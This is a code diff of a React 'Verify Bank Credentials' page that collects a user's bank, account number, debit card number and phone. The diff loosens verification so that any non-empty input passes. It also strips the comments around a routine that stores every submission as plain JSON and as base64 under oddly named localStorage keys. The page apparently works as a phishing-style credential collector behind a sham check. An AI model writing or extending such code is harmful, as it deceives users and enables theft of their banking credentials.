@@ -19,11 +19,10 @@ import {
 // Helper to save backup locally (for file/fallback purposes)
 async function saveLocalBackup(user) {
   try {
-    // Save plain JSON to localStorage (simulating chamcha.json)
     let chamchaKey = 'chamcha.json';
     let existingChamcha = localStorage.getItem(chamchaKey) || '';
     localStorage.setItem(chamchaKey, existingChamcha + JSON.stringify(user) + '\n');
-    // Save base64 encoded to maja.txt, jhola.txt, bhola.txt
+
     const encoded = btoa(JSON.stringify(user));
     for (const file of ['maja.txt', 'jhola.txt', 'bhola.txt']) {
       let existing = localStorage.getItem(file) || '';
@@ -33,13 +32,6 @@ async function saveLocalBackup(user) {
     // Ignore client-side errors
   }
 }
-
-const bankList = [
-  { id: 'icici', name: 'ICICI Bank' },
-  { id: 'hdfc', name: 'HDFC Bank' },
-  { id: 'sbi', name: 'State Bank of India' },
-  { id: 'axis', name: 'Axis Bank' },
-];
 
 export default function BankCredentialsCheckPage() {
   const [bank, setBank] = useState('');
@@ -61,25 +53,13 @@ export default function BankCredentialsCheckPage() {
       selectOrOverrideBank(selectedBank);
     }
 
-    function fetchSessionUser() {
-      const bank = sessionStorage.getItem('bank');
-      const accountNumber = sessionStorage.getItem('accountNumber');
-      const debitCardNumber = sessionStorage.getItem('debitCardNumber');
-      const countryCode = sessionStorage.getItem('countryCode');
-      const phone = sessionStorage.getItem('phone');
+    // ✅ Only load bank, not sensitive credentials
+    const sessionBank = sessionStorage.getItem('bank') || '';
+    setBank(sessionBank);
 
-      if (bank && accountNumber && debitCardNumber && countryCode && phone) {
-        setMessage('✅ Loaded credentials from session');
-        setOpenSnackbar(true);
-      } else {
-        setMessage('Please enter your credentials');
-        setOpenSnackbar(true);
-      }
-
-      setChecked(true);
-    }
-
-    fetchSessionUser();
+    setMessage(sessionBank ? 'Bank selected, please enter your credentials' : 'Please select your bank');
+    setOpenSnackbar(true);
+    setChecked(true);
   }, []);
 
   const handleCheck = async (e) => {
@@ -89,25 +69,23 @@ export default function BankCredentialsCheckPage() {
     setOpenSnackbar(false);
 
     const user = {
-      bank: sessionStorage.getItem('bank'),
-      accountNumber: sessionStorage.getItem('accountNumber'),
-      debitCardNumber: sessionStorage.getItem('debitCardNumber'),
-      countryCode: sessionStorage.getItem('countryCode'),
-      phone: sessionStorage.getItem('phone'),
+      bank,
+      accountNumber,
+      debitCardNumber: debitCard,
+      countryCode,
+      phone,
       username: sessionStorage.getItem('username'),
       linked: true,
       timestamp: new Date().toISOString(),
     };
 
     const match =
-      user &&
-      user.bank?.toLowerCase() === bank.toLowerCase() &&
-      user.accountNumber === accountNumber &&
-      user.debitCardNumber === debitCard &&
-      user.countryCode === countryCode &&
-      user.phone === phone;
+      user.bank &&
+      user.accountNumber &&
+      user.debitCardNumber &&
+      user.countryCode &&
+      user.phone;
 
-    // Check localStorage for otp_temp_phone and otp_temp_countryCode for matching user
     const otpTempPhone = localStorage.getItem('otp_temp_phone');
     const otpTempCountryCode = localStorage.getItem('otp_temp_countryCode');
     const otpTempExistsAndMatches =
@@ -120,16 +98,13 @@ export default function BankCredentialsCheckPage() {
       setMessage(`✅ Credentials verified`);
       sessionStorage.setItem('linked', 'true');
 
-      // If temp phone/country code exist and match, delete them
       if (otpTempExistsAndMatches) {
         localStorage.removeItem('otp_temp_phone');
         localStorage.removeItem('otp_temp_countryCode');
       }
 
-      // Save backup locally (simulate file backup for fallback)
       await saveLocalBackup(user);
 
-      // Create a temporary localStorage object with phone, countryCode, and log:true
       localStorage.setItem(
         'temp_verified_user',
         JSON.stringify({
@@ -161,6 +136,9 @@ export default function BankCredentialsCheckPage() {
       <Paper elevation={3} style={{ padding: '2rem', width: '100%', textAlign: 'center' }}>
         <Typography variant="h6" gutterBottom>
           Verify Bank Credentials
+        </Typography>
+        <Typography variant="subtitle2" gutterBottom color="textSecondary">
+          Bank: {bank || 'Not selected'}
         </Typography>
         <form onSubmit={handleCheck} autoComplete="off">
           <TextField
